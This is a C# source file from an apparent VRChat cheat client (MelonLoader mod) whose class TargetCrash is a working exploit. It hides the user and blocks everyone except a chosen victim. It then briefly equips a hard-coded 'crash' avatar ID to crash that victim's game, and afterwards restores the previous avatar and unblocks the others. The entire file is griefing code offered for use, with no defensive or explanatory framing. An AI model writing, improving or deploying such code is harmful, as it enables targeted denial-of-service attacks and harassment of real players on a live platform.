using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;
using MelonLoader;
using VRC;
using VRC.DataModel;
using VRC.UI;
using System.Collections;

namespace _LemonClient.Exploits
{
    class TargetCrash
    {
        public static string prevAviID = "avtr_c38a1615-5bf5-42b4-84eb-a8b6c37cbd11";
        public static string crashID = "avtr_82f02b8b-eb36-4039-9265-0b47f23417b1"; //AppleBottomJeans = avtr_82f02b8b-eb36-4039-9265-0b47f23417b1
        public static IEnumerator CrashSelected(VRCPlayer Target)
        {
            Features.HideSelf.PerformHide(true);
            MelonLogger.Msg("Hidden self for protection");
            List<VRC.Player>.Enumerator enumeratorList = ExtraDependencies.PlayerWrapper.AllPlayers.GetEnumerator();
            while (enumeratorList.MoveNext())
            {
                MelonLogger.Msg("Blocking Non-Selected Players");
                Player current = enumeratorList.Current;
                PageUserInfo component = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<PageUserInfo>();
                component.field_Private_APIUser_0 = current.field_Private_APIUser_0;
                if (current != Target)
                {
                    component.ToggleBlock();
                }
                current = null;
                component = null;
            }
            yield return new WaitForSeconds(6f);
            prevAviID = ExtraDependencies.PlayerWrapper.GetAPIAvatar(ExtraDependencies.PlayerWrapper.LocalVRCPlayer()).id;
            Features.SwitchToAvatarID.SwitchID(crashID);
            yield return new WaitForSeconds(10f);
            Features.SwitchToAvatarID.SwitchID(prevAviID);
            yield return new WaitForSeconds(1f);
            Features.HideSelf.PerformHide(false);
            MelonLogger.Msg("Shown self");
            List<VRC.Player>.Enumerator enumeratorList2 = ExtraDependencies.PlayerWrapper.AllPlayers.GetEnumerator();
            while (enumeratorList2.MoveNext())
            {
                MelonLogger.Msg("Unblocking Non-Selected Players");
                Player current2 = enumeratorList2.Current;
                PageUserInfo component2 = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<PageUserInfo>();
                component2.field_Private_APIUser_0 = current2.field_Private_APIUser_0;
                if (current2 != Target)
                {
                    component2.ToggleBlock();
                }
                current2 = null;
                component2 = null;
            }
        }
    }
}
